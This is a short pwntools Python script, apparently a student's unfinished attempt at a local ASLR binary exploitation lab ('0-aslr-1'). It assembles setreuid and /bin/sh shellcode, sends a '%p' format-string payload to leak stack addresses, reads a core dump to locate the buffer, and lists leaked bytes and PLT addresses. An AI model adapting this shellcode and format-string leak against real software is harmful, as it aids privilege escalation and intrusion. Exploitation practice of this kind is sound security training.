#the first read from the program reads a name.
#the second asks how many bytes of your name you want to print
#usual format for payload: {___shellcode___, padding, address of buff}

#what needs to be adapted to work with aslr?

from pwn import *

p = process("./0-aslr-1")

context.arch = "i386"

print(p.recv()) #where is buf?\n name:
#not sure what to provide here...
#maybe exploit the fact that you can leak addresses form here? maybe the first thing form the output is the buff_addr
#p.sendline(p.elf.symbols['read'])
shell = asm(shellcraft.i386.linux.setreuid())
shell += asm(shellcraft.i386.linux.sh())
payload = ((b"%p%p%p%p") * 20)
p.sendline(payload)

print(p.recv()) #how many bytes of your name do you want to read?

#here we need to send the payload
#[shellcode]--padding--->address of buff? read? setvbuf?
p.sendline("200")

print(p.recv())

p.interactive()


core = Core("core")

buff_addr = core.stack.find(payload)
print(hex(buff_addr))



# p.interactive()

# 0xff8579dc  this might be the rip address for once in input_func


##this is the output:
# \xf7\x01\x00\x00\x00\x00\x00\x00\x00\xd3\x82\x04\x08 
# \xa0\x04\x08\xc8\xff\xf8\xf7\x99'\xdf\xf7\x00`\xf5\xf7
# \x80m\xf5\xf7\x00`\xf5\xf7x\xad\xca\xff\xf2\xef\xde\xf7
# \x80m\xf5\xf7\x00\x00\x00\x00\x00\x00\x00\x00\xc2\x00\x00\x00
# \xd7\xef\xde\xf7\x80H\xf5\xf7\x80m\xf5\xf7\xfbe\xde\xf7\x80m\xf5
# \xf7\x00\x00\x00\x00\x00\x00\x00\x00\xf3z\xe7\xf7\x19\xff\xf8\xf7!

'''
0x80483f0: read@plt
0x8048400: printf@plt
0x8048410: puts@plt
0x8048420: __libc_start_main@plt
0x8048430: write@plt
0x8048440: setvbuf@plt
0x8048450: prctl@plt
0x8048460: __isoc99_scanf@plt
'''